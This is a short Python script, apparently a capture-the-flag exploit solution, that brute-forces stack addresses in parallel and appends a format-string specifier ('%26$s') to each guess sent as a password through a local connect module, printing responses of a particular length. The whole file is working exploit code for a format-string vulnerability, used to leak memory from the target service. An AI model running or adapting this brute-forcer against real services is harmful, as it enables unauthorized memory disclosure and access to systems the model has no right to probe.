#! /usr/bin/python3
import tqdm
from tqdm.contrib.concurrent import process_map  # or thread_map

import connect


def process(i):
    guess = bytes((i % 0xFF, (i // 0x100) % 0xFF, (i // 0x10000) % 0xFF, (i // 0x1000000) % 0xFF))
    try:
        out = connect.connect(password=guess + b"%26$s")
    except ConnectionResetError:
        return
    if len(out.strip()) == 30:
        tqdm.tqdm.write(' '.join((str(guess), str(len(out)), str(out),)))


def main():
    r = process_map(process, tqdm.trange(0xbfffffff, 0xbf000000, -4), max_workers=16, chunksize=16)


if __name__ == '__main__':
    main()
